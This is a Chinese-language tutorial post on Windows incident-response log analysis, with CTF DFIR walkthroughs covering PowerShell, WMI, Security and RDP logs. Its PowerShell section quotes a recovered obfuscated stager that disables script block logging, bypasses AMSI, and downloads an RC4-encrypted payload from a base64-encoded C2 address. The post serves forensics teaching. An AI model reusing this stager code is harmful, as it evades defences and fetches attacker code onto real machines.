市面上的应急响应太乱太杂，还有点简单，而且大多是理论，所以重新写一下(

Windows事件ID
-----------

eventid右键group，看summary，即可知道该id代表的具体的信息

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-365785d96035b90b6c7f798ca940ce4aeddd4297.png)

登录类型 ID
-------

成功/失败登录事件提供的有用信息之一是用户/进程尝试登录（登录类型），但 Windows 将此信息显示为数字，下面是数字和对应的说明：

| **登录类型** | **登录类型** | **描述** |
|---|---|---|
| 2 | Interactive | 用户登录到本机 |
| 3 | Network | 用户或计算手机从网络登录到本机，如果网络共享，或使用 net use 访问网络共享，net view 查看网络共享 |
| 4 | Batch | 批处理登录类型，无需用户干预 |
| 5 | Service | 服务控制管理器登录 |
| 7 | Unlock | 用户解锁主机 |
| 8 | NetworkCleartext | 用户从网络登录到此计算机，用户密码用非哈希的形式传递 |
| 9 | NewCredentials | 进程或线程克隆了其当前令牌，但为出站连接指定了新凭据 |
| 10 | Remotelnteractive | 使用终端服务或远程桌面连接登录 |
| 11 | Cachedlnteractive | 用户使用本地存储在计算机上的凭据登录到计算机（域控制器可能无法验证凭据），如主机不能连接域控，以前使用域账户登录过这台主机，再登录就会产生这样日志 |
| 12 | CachedRemotelnteractive | 与 Remotelnteractive 相同，内部用于审计目的 |
| 13 | CachedUnlock | 登录尝试解锁 |

日志目录
----

`C:\Windows\System32\winevt\Logs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-283a2b95b6aaea8bb7a7424a16cf8362d1d5240d.png)

日志分析工具-MessageAnalyzer
----------------------

<https://learn.microsoft.com/en-us/message-analyzer/viewing-message-data>

### 多文件导入功能

点击new session、files

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-191f02b0a5804536631d473e056c56091d6bc27b.png)

### 添加colum、group功能

右边的field chooser-add as column实际添加显示的列

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-6b0dd21325db514d06ad1a73fe8f6eda10a7eedc.png)

右键group则是分类，一列数据有多少种，可以叠加使用  
![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-c99cf1fa316f4aaa859e511e11296deeb8364919.png)

### filter功能

```php
&& — 表示逻辑与函数
|| — 表示逻辑或函数
！— 表示逻辑 NOT 函数。通常用于否定。
== — 等于。计算两个过滤器表达式操作数是否相等的运算符。
!= — 不等于。一个运算符，用于评估两个过滤器表达式操作数的值不相等。请注意，此运算符还将不存在评估为一种否定形式。
~= — 不等于。此运算符仅否定值的条件，但不会将不存在评估为否定形式。

过滤器表达式TCP.SourcePort != 443返回所有SourcePort值不等于443的TCP消息，以及所有非TCP消息。
过滤器表达式TCP.SourcePort ~= 443取反该值的条件，将返回源端口不等于443的 TCP 消息，但不会包括非TCP消息。

> — 大于
>= — 大于或等于
< — 小于
<= — 小于或等于
in — 数组、集合或映射。
例如：IPv4.Address in [192.0.1.1, 192.0.0.0, 192.0.0.2]或TCP.SourcePort in [6608, 6609, 6610]。

布尔运算符和按位运算符：|、^、&、~ 和 !。
移位运算符：<< 和 >>。
算术运算符：+、-、*、/ 和 %
TCP.SourcePort + 1 == TCP.DestinationPort / 2
```

大多数找到相应的值然后右键添加filter即可

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-2141cb7d3843d4321d3dea1bc06fabedf7000bdf.png)

### track功能

右键track即可跟踪该字段，在爪子符号的栏目中可以看到

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-9e823326a2caef9c00c2c2f27e99734d27a1cf61.png)  
删除点stop即可

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-a8bfdb95b1f58fd84c4f344f64bf122dd0f0490c.png)

右键include hex for numeric value可以显示他的值

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-d673b60b09c5f068cd0f0a469f3b968084aa2614.png)

### property和filed的区别

filed是EventLog下的字段，也是用Windows直接点开日志文件所能看见的信息的字段

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-50784c633f7edc56b822589233721b7f70625ced.png)  
property即箭头指的部分，则是global annotations和global properties的字段

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-a2e870c8c33563363d554ec240c488b9bfedd4f9.png)

### 查找字符串

没研究出怎么查字符串，理论上这样就可以，但是会显示为空

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-1ce7d1d731b570815480f02dde8ae04379cf199a.png)

Windows自带的事件查看器倒是可以查找

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-5e8234cb370075b8650042328ca7e57310978fe0.png)

后来发现是要加前缀

`EventLog.Message contains ""`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-3ea996742bb1eaf37673bbf2f380f34e7fe56f6f.png)

### 日志分析入手点

1、注意LeverDisplayName是信息还是警告

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-7b3ad490f4e2b12f8984a355b536421f06b8104a.png)

2、根据事件ID

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-fc855993b7daad16d5f74e1c097cac197699496e.png)

PowerShell日志
------------

跟powershell有关的有以下四个日志

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-135acc7d416c462edca94f6756bd51442dd4f347.png)

其中最重要的是Microsoft-Windows-PowerShell%4Operational，即操作日志，

Microsoft-Windows-PowerShell%4Admin，即admin日志

Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational是powershell下载文件日志

Windows PowerShell主要记录一些基本信息，无安全相关

```php
事件ID 400：引擎状态从无更改为可用，记录任何本地或远程PowerShell活动的开始；
事件ID 600：记录类似“WSMan”等提供程序在系统上进行PowerShell处理活动的开始，比如”Provider WSMan Is Started“；
事件ID 403：引擎状态从可用状态更改为停止，记录PowerShell活动结束。

400和403事件的消息详细信息包括HostName字段。如果在本地执行，则此字段将记录为HostName = ConsoleHost。如果正在使用PowerShell远程处理，则访问的系统将使用HostName = ServerRemoteHost记录这些事件。两条消息都不记录与PowerShell活动关联的用户帐户。但是通过使用这些事件，可以确定PowerShell会话的持续时间，以及它是在本地运行还是通过远程运行
```

### DownUnderCTF 2022 DFIR Investigation powershell取证部分

4104是远程命令执行的事件ID，字段是ScriptBlockText，在Microsoft-Windows-PowerShell%4Operational.evtx中

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-0d45250280acc3d42033262f0221b7a56304cc95.png)

也可以用Microsoft Message Analyzer

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-e3dbf36f5c2f4dfa6ec51a9ac880864d2bf801d4.png)

```powershell
If($PSVERSiOnTAblE.PSVerSIOn.MajOr -gE 3){$f0C32=[ref].ASseMBLy.GEtTyPE('System.Management.Automation.Utils')."GETFiE`LD"('cachedGroupPolicySettings','N'+'onPublic,Static');If($f0C32){$eA761=$f0c32.GetVaLuE($NULL);IF($Ea761['ScriptB'+'lockLogging']){$Ea761['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$eA761['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$Val=[ColLECtiONs.GeNEric.DIctioNAry[strIng,SystEm.ObJEct]]::neW();$vAL.ADd('EnableScriptB'+'lockLogging',0);$VaL.AdD('EnableScriptBlockInvocationLogging',0);$eA761['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$Val}ELsE{[SCriPTBlOCK]."GETFIe`LD"('signatures','N'+'onPublic,Static').SeTVAlUE($NULl,(New-ObjECT COllECtIONs.GeneRiC.HAshSet[StRiNG]))}$Ref=[ReF].ASsEmbLY.GetTyPE('System.Management.Automation.Amsi'+'Utils');$ReF.GEtFIelD('amsiInitF'+'ailed','NonPublic,Static').SETVALUe($nULL,$TRUe);};[SYStEm.Net.ServiCePOintMaNagER]::ExpECt100ConTinuE=0;$B3904=New-OBjECT SYsTEM.Net.WEbClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([TexT.EncODinG]::UNICOdE.GETStRiNg([CONvErt]::FrOMBaSe64StRING('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIANwA6ADcANwA3ADcA')));$t='/news.php';$B3904.HEadErS.AdD('User-Agent',$u);$b3904.PROXY=[SYSTeM.NEt.WebREQuESt]::DefaUlTWebPrOxY;$B3904.Proxy.CredeNTIalS = [SySTeM.NEt.CREdEntIaLCAChe]::DEFAuLtNETworKCreDEntIals;$Script:Proxy = $b3904.Proxy;$K=[SysteM.Text.ENCoDInG]::ASCII.GEtBYtes('/Y0dzf;_)NkL^~M#K(xG]*rOFe,C}2%R');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXoR$S[($S[$I]+$S[$H])%256]}};$B3904.HeaderS.ADD("Cookie","lvzoFoofzAIvDVtv=R7eEC+1KSXf3X+sUQhz2DF+NSjQ=");$DATa=$b3904.DOWnLOAdDATA($SEr+$T);$iv=$Data
```

命令中有一段base64解一下

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-2061a3a66bf12b5f67d6aa8c7ba330252abda6ac.png)

WMI日志
-----

`C:\Windows\System32\wbem\Repository\`目录下的OBJECTS.DATA，是 WMI 存储库，记录持久化 WMI 对象

可以直接打开，也可以用PyWMIPersistenceFinder

### WMI 事件类型

- 内部事件（Intrinsic）

> **NamespaceOperationEvent** ClassCreationEvent
> 
> **NamespaceModificationEvent** InstanceOperationEvent
> 
> **NamespaceDeletionEvent** InstanceCreationEvent
> 
> **NamespaceCreationEvent** MethodInvocationEvent
> 
> **ClassOperationEvent** InstanceModificationEvent
> 
> **ClassDeletionEvent** InstanceDeletionEvent
> 
> **ClassModificationEvent** TimerEvent
> 
> **ConsumerFailureEvent** EventDroppedEvent
> 
> **EventQueueOverflowEvent** MethodInvocationEvent

- 外部事件（Extrinsic）

> ROOT\\CIMV2:Win32\_ComputerShutdownEvent  
> ROOT\\CIMV2:Win32\_IP4RouteTableEvent  
> ROOT\\CIMV2:Win32\_ProcessStartTrace  
> ROOT\\CIMV2:Win32\_ModuleLoadTrace  
> ROOT\\CIMV2:Win32\_ThreadStartTrace  
> ROOT\\CIMV2:Win32\_VolumeChangeEvent  
> ROOT\\CIMV2:Msft\_WmiProvider\*  
> ROOT\\DEFAULT:RegistryKeyChangeEvent  
> ROOT\\DEFAULT:RegistryValueChangeEvent

内部事件查询（由于轮询方式，需要使用 WITHIN 子句指定轮询间隔）

```sql
每隔30秒查询一次后缀为"doc"和"docx"的文件操作：
SELECT * FROM __InstanceOperationEvent WITHIN 30 WHERE
((__CLASS = "__InstanceCreationEvent" OR __CLASS = "__InstanceModificationEvent") AND TargetInstance ISA "CIM_DataFile") AND (TargetInstance.Extension = "doc") OR (TargetInstance.Extension = "docx")
```

外部事件查询（等效于实时）

```sql
可移动设备（EventType=2）插拔：
SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2
```

### DownUnderCTF 2022 DFIR Investigation WMI取证部分

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-dc3553d51104d41b7c974bf65db03b29de72d253.png)

这个命令是WMI的语法，设置了一个计时器(TargetInstance)

也可以用`https://github.com/davidpany/WMI_Forensics.git`进行解析`python2 PyWMIPersistenceFinder.py OBJECTS.DATA`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-1fe5d5a537bf3204c0fa40ed0bd1597e6cccdab4.png)

```sql
SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute= 38 GROUP WITHIN 60
```

```php
TargetInstance.Hour = 12 AND TargetInstance.Minute= 38
```

所以下次执行就是就是12:38

Security日志
----------

存储登录安全相关的信息，比如用户登录

### 首届数据安全大赛 BuleTeam1

筛选找到4625，即登陆失败的事件id。newguest

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-9d6d102fa411f41905d683757fbaf78892859d46.png)

### 首届数据安全大赛 BuleTeam2

筛选`EventLog.TaskDisplayName == "Logon"`，然后按照事件排序，一开始都是正常的，后来都是登陆失败，找到登陆失败后的第一次成功

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-85652deefe99353ab31faf768f519fbbb2b3eb89.png)

没有ip，但是知道了用户是ming

筛选：`(EventLog.TaskDisplayName == "Logon") and (EventLog.EventData["TargetUserName"] == "ming")`

找到ip是192.168.13.1

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-af57fc7ec08e791250ff52475924de814aefc512.png)

往上翻翻可以看见第一次是1825，通过NTLM进来的

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-aabd3357320a212e66199023530a41b19ba13cdf.png)

System日志
--------

存储系统组件日志

### 2022 蓝帽杯 神秘的日志

ntlm relay中肯定存在用户登录行为，需要注意4624和4627，但是题目给出的4624日志太多了，需要找到一个时间点，这就需要通过Windows事件日志6038可以审核NTLM的使用情况：

> Microsoft Windows Server 检测到客户端与此服务器之间当前正在使用 NTLM 身份验证。当客户端与此服务器之间第一次使用 NTLM 时，每次启动服务器都会发生此事件。

在 system 日志中找到了一个6038日志的记录：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-3ae9dc053f37e917c005142566c5b9e1cde10c28.png)

根据6038日志的时间（2022/4/17 11:27:06）在security日志中寻找该时间的logon日志

WinRM日志
-------

Windows远程管理（WinRM）服务实现其远程处理功能，也可能记录远程PowerShell活动：

```php
Microsoft-Windows-WinRM/Operational.evtx  
Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational.evtx  
Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational.evtx  
Microsoft-Windows-TerminalServices-LocalSessionManager/Operational.evtx
```

接首届数据安全大赛 BuleTeam2，在Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational.evtx中发现是远程登录，可以判断是3389端口

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-16debc1eaf8c79bc85572366faff30a550fbb0fe.png)

其他日志文件会在域渗透的应急响应里写(如果不鸽的话)